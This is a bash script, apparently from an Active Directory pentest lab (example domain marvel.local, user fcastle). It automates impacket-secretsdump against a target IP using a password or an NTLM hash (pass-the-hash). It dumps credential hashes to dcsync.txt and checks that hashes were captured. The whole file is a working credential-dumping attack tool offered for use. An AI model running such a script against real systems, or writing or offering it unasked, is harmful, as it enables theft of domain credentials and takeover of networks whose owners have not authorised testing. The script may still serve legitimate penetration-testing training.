#!/bin/bash

# Color setup
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RED='\033[1;31m'
NC='\033[0m'

echo -e "${CYAN}=============================================="
echo "            SecretsDump Automation            "
echo -e "==============================================${NC}\n"

# Ask authentication method
echo -e "${YELLOW}Select Authentication Type:${NC}"
echo "1) Password"
echo "2) NTLM Hash"
read -p "Choose (1 or 2): " auth_type

# Get domain, username, target
read -p "Enter domain (e.g., marvel.local): " domain
read -p "Enter username (e.g., fcastle): " username
read -p "Enter target machine IP (e.g., 192.168.136.146): " target_ip

# Safety check for domain, username, target
if [[ -z "$domain" || -z "$username" || -z "$target_ip" ]]; then
    echo -e "${RED}Error: Domain, username, and target IP are required. Exiting.${NC}"
    exit 1
fi

# Check if IP is reachable
echo -e "\n${YELLOW}Checking connection to Target Machine...${NC}"
if ping -c 1 -W 2 "$target_ip" &> /dev/null; then
    echo -e "${CYAN}Target Machine is reachable.${NC}"
else
    echo -e "${RED}Target Machine is NOT reachable at $target_ip. Please check the IP and network.${NC}"
    exit 1
fi

# Prepare output file name
output_file="dcsync.txt"
if [[ ! -f "$output_file" ]]; then
    touch "$output_file"
    echo -e "${YELLOW}Output file '${output_file}' created.${NC}"
fi

# Build command depending on authentication type
if [[ "$auth_type" == "1" ]]; then
    read -p "Enter password (special characters will be escaped automatically): " password

    if [[ -z "$password" ]]; then
        echo -e "${RED}Error: Password is required for password-based authentication.${NC}"
        exit 1
    fi

    # Escape special characters in password
    escaped_password=$(sed 's/[][\!*.^$\/#&@]/\\&/g' <<< "$password")

    echo -e "\n${YELLOW}This is the command that will be executed:${NC}"
    echo "impacket-secretsdump -outputfile ${output_file} '${domain}/${username}:${escaped_password}@${target_ip}'"

    read -p "Do you want to run this command now? (y/n): " confirm

    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        timeout 60s impacket-secretsdump -outputfile "${output_file}" "${domain}/${username}:${escaped_password}@${target_ip}" | tee -a "${output_file}"
    else
        echo -e "${YELLOW}Command not executed.${NC}"
        exit 0
    fi

elif [[ "$auth_type" == "2" ]]; then
    echo -e "\n${YELLOW}Choose hash format:${NC}"
    echo "1) LM:NTHASH"
    echo "2) Only NTHASH (use ':' before hash)"
    read -p "Choose (1 or 2): " hash_type

    if [[ "$hash_type" == "1" ]]; then
        read -p "Enter full LM:NTHASH (inside single quotes, e.g. 'LMHASH:NTHASH'): " full_hash
        if [[ -z "$full_hash" ]]; then
            echo -e "${RED}Error: Hash is required.${NC}"
            exit 1
        fi
    elif [[ "$hash_type" == "2" ]]; then
        read -p "Enter only NTHASH (inside single quotes, e.g. ':NTHASH'): " full_hash
        if [[ -z "$full_hash" ]]; then
            echo -e "${RED}Error: NTHASH is required.${NC}"
            exit 1
        fi
    else
        echo -e "${RED}Invalid hash type selected.${NC}"
        exit 1
    fi

    echo -e "\n${YELLOW}This is the command that will be executed:${NC}"
    echo "impacket-secretsdump -outputfile ${output_file} -hashes '${full_hash}' '${domain}/${username}@${target_ip}'"

    read -p "Do you want to run this command now? (y/n): " confirm

    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        timeout 60s impacket-secretsdump -outputfile "${output_file}" -hashes "${full_hash}" "${domain}/${username}@${target_ip}" | tee -a "${output_file}"
    else
        echo -e "${YELLOW}Command not executed.${NC}"
        exit 0
    fi

else
    echo -e "${RED}Invalid authentication type selected.${NC}"
    exit 1
fi

# Final check after execution
echo -e "\n${CYAN}SecretsDump execution completed.${NC}"

if grep -q ":::.*:::" "$output_file"; then
    echo -e "\n${YELLOW}Hashes successfully dumped into ${output_file}.${NC}"
else
    echo -e "${YELLOW}No hashes found. Something may have failed.${NC}"
fi

